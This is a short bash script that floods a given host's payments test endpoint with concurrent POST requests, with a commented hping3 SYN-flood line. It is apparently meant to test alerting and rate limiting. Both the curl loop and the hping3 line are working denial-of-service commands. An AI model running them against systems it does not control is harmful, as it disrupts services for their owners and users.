#!/usr/bin/env bash
# HTTP flood: latency and 5xx rise. Signal -> rate limit + restart.
set -euo pipefail
TARGET="$1"; DURATION="${2:-60}"; CONCURRENCY="${3:-50}"
echo "HTTP flood -> http://$TARGET/api/payments/test for ${DURATION}s (x${CONCURRENCY})"
end=$(( $(date +%s) + DURATION ))
flood() { while [ "$(date +%s)" -lt "$end" ]; do curl -s -o /dev/null -X POST "http://$TARGET/api/payments/test"; done; }
for _ in $(seq 1 "$CONCURRENCY"); do flood & done
wait
echo "Flood done."
# hping3 variant (network level):
# sudo hping3 -S -p 80 --flood "$TARGET"
